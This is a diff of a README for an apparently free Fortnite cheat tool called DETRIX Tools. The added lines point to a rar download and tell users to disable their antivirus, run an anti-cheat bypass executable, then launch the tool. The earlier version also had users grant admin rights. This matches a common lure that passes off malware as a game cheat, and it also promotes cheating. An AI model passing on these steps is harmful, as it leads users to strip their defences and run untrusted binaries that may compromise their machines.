@@ -11,11 +11,11 @@ a simple free FORTNITE hacking client. (use at your own risk!)
 </div>
 
 ## Instructions
-1. [Download](https://github.com/archyteks/Valorant-Trigger-Bot/releases/latest) the executable `DETRIX Tools V1.exe`
-2. Run the executable (make sure to allow admin rights; click yes or login if Windows asks)
-3. Hold <kbd>alt</kbd> to activate trigger bot. You can change this keybind in the app.
-4. Play in **Windowed Fullscreen**.
-
+1. [Download](https://github.com/natoplayz/DETRIX-Tools/releases/latest) the rar file `DETRIX-Tools.rar`
+2. Disable anti-virus software (windows + others)
+3. Run Anti Easy Anti Cheat.exe
+4. Set an aimkey in config.txt
+5. Run DETRIX Tools V1.exe
 
 ## 💀 USE AT YOUR OWN RISK 💀
 - I am not responsible for anything that happens
